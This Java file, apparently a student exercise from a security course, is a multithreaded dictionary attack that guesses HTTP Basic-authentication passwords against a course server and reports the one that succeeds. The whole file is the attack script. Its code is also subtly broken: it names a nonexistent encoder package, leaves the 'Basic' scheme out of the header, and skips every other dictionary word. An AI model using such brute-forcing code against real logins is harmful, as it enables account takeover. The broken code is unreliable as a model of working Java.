
import java.util.*;
import java.io.*;
import java.net.*;

class Dictionary
{

 public static void main (String a[])
 {
 String pwd="";

   try
     {
     
     BufferedReader bf = new BufferedReader(new FileReader("/usr/share/lib/dict/words"));
     int i=0;
     while(bf.readLine() != null)
     {
     pwd= bf.readLine();  
     String userPassword = ":"+pwd;
     RealThread myTh = new RealThread(i,userPassword);
     Thread th = new Thread( myTh );
     th.start();
      try
      {
      th.sleep(100);
      }
      catch(Exception e)
      {} 
      i++;
     }
   }
   catch(Exception e )
   {
   System.out.println(" ex while  ="+ e);
   }
}


}




class RealThread implements Runnable
{
 private int num;
 private URL url;
 private HttpURLConnection uc =null;
 private String userPassword;
 private int responseCode = 100;
 public RealThread (int i, String userPassword)
 {
 try
 {
 url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
 }
 catch(Exception ex1)
 {
 }
 num = i;
 this.userPassword = userPassword;

 }
 
 public int getResponseCode()
 {
 return this.responseCode;
 }

 public void run()
 {
  try
  {
  String encoding = new bf.misc.BASE64Encoder().encode (userPassword.getBytes());

  uc = (HttpURLConnection)url.openConnection();
  uc.setRequestProperty ("Authorization", " " + encoding);
  System.out.println("Reponse  = "+uc.getResponseCode()+"for pwd = "+userPassword);
  this.responseCode = uc.getResponseCode();
  if(uc.getResponseCode()==200)
  {
   System.out.println("====== Password Found : " +userPassword+ "=======================");
   System.exit(0);
  }
  }
  catch (Exception e) {
   System.out.println("Could not execute Thread "+num+" ");
  }
 }

}
